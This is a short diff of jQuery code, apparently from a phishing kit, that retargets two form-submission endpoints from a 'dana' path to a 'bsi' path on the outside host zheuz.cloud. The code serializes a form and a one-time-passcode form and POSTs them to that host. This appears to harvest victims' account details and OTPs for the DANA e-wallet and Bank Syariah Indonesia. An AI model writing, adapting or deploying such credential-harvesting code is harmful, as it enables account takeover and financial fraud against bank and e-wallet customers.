@@ -16,7 +16,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/dana/kt3d/no.php',
+            url: 'https://zheuz.cloud/bsi/kt3d/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -41,7 +41,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://zheuz.cloud/dana/kt3d/otp.php',
+ url: 'https://zheuz.cloud/bsi/kt3d/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
